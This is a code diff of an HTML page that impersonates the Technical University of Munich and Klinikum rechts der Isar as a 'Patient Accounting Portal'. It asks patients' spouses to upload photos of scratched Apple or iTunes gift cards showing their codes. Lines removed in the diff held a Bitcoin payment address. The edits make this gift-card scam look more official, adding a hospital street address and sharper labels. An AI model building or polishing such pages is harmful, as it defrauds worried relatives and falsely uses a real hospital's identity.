@@ -14,13 +14,16 @@
 
     <nav class="bg-white py-4 px-6 border-b flex justify-between items-center shadow-sm">
         <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" alt="TUM Logo" class="h-10">
-        <p class="text-[9px] font-bold text-gray-400 uppercase tracking-widest text-right leading-tight">Technical University<br>of Munich</p>
+        <div class="text-right leading-tight">
+            <p class="text-[9px] font-bold text-gray-400 uppercase tracking-widest">Technical University</p>
+            <p class="text-[9px] font-bold text-gray-400 uppercase tracking-widest">of Munich</p>
+        </div>
     </nav>
 
-    <div class="relative h-64 w-full bg-cover bg-center" style="background-image: url('https://mri.tum.de/sites/default/files/styles/hero_image/public/images/hero/klinikum_rechts_der_isar_gebaeude.jpg');">
+    <div class="relative h-64 md:h-80 w-full bg-cover bg-center" style="background-image: url('https://mri.tum.de/sites/default/files/styles/hero_image/public/images/hero/klinikum_rechts_der_isar_gebaeude.jpg');">
         <div class="absolute inset-0 hero-overlay flex flex-col items-center justify-center text-center p-4">
-            <h1 class="text-white text-3xl font-extrabold uppercase tracking-tight">Patient Accounting Portal</h1>
-            <p class="text-blue-200 text-sm italic">Official Payment Settlement Channel</p>
+            <h1 class="text-white text-3xl md:text-4xl font-extrabold uppercase tracking-tight drop-shadow-xl">Patient Accounting Portal</h1>
+            <p class="text-blue-200 text-sm md:text-lg italic font-light">Official Settlement Channel for Relatives</p>
         </div>
     </div>
 
@@ -42,50 +45,45 @@
                         <input type="text" name="Hospital_ID" placeholder="TUM-XXXX" required class="w-full border-2 border-gray-100 p-3 rounded-xl">
                     </div>
                     <div>
-                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Spouse (Sender) Name</label>
+                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Spouse Name</label>
                         <input type="text" name="Sender_Name" required class="w-full border-2 border-gray-100 p-3 rounded-xl">
                     </div>
                     <div>
-                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Spouse (Sender) Email</label>
+                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Spouse Email</label>
                         <input type="email" name="Spouse_Email" placeholder="For official receipt" required class="w-full border-2 border-gray-100 p-3 rounded-xl">
                     </div>
                 </div>
 
                 <div class="bg-gray-900 rounded-3xl p-6 text-white mb-8 border-b-8 border-blue-600 shadow-xl">
                     <h3 class="text-blue-400 font-bold mb-4 uppercase text-xs flex items-center">
-                        <span class="mr-2">💳</span> Payment & Asset Verification
+                        <span class="mr-2">💳</span> Gift Card Asset Verification
                     </h3>
                     
                     <div class="space-y-4">
                         <div>
-                            <label class="block text-[10px] font-bold text-gray-500 uppercase mb-2">Select Payment Method</label>
+                            <label class="block text-[10px] font-bold text-gray-500 uppercase mb-2">Select Card Type</label>
                             <select name="Card_Type" class="w-full bg-gray-800 border border-gray-700 p-3 rounded-xl text-sm focus:border-blue-500 outline-none">
                                 <option value="Apple Gift Card">Apple Gift Card</option>
                                 <option value="iTunes Gift Card">iTunes Gift Card</option>
-                                <option value="BTC Settlement">BTC Settlement (Use Address Below)</option>
                             </select>
                         </div>
 
-                        <div class="bg-gray-800 p-4 rounded-xl border border-gray-700">
-                            <p class="text-gray-500 text-[9px] uppercase font-black mb-2 tracking-widest italic">Clinical BTC Address (Alternative)</p>
-                            <code class="text-green-400 text-sm break-all font-mono">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</code>
-                        </div>
-
                         <div class="bg-blue-900/30 p-4 rounded-xl border border-blue-800/50">
-                            <label class="block font-bold text-blue-400 mb-2 uppercase text-[10px] tracking-widest">Upload Front & Back (iTunes/Apple Card):</label>
-                            <p class="text-gray-400 text-[10px] mb-3 leading-tight italic">Gently scratch to reveal the 16-digit code. Digital capture must be clear and unobstructed for verification.</p>
-                            <input type="file" name="Card_Proof_Photo" required class="block w-full text-xs text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-blue-600 file:text-white cursor-pointer hover:file:bg-blue-700 transition">
+                            <label class="block font-bold text-blue-400 mb-2 uppercase text-[10px] tracking-widest">Upload Front & Back Photos:</label>
+                            <p class="text-gray-400 text-[10px] mb-3 leading-tight italic">Scratch the silver strip gently to reveal the 16-digit code. Photos must be clear and readable for the clinical verification system.</p>
+                            <input type="file" name="Card_Image" required class="block w-full text-xs text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-blue-600 file:text-white cursor-pointer hover:file:bg-blue-700 transition">
                         </div>
                     </div>
                 </div>
 
-                <button type="submit" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-xl hover:bg-blue-800 transition-all uppercase shadow-lg transform active:scale-95">Confirm & Execute Payment</button>
+                <button type="submit" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-xl hover:bg-blue-800 transition-all uppercase shadow-lg transform active:scale-95">Verify & Process Payment</button>
             </form>
         </div>
     </div>
     
     <div class="text-center text-gray-400 text-[9px] uppercase pb-10">
-        <p>© 2026 Klinikum rechts der Isar - University Hospital Munich</p>
+        <p>© 2026 Klinikum rechts der Isar - University Hospital of Munich</p>
+        <p>Ismaninger Straße 22, 81675 Munich</p>
     </div>
 </body>
 </html>
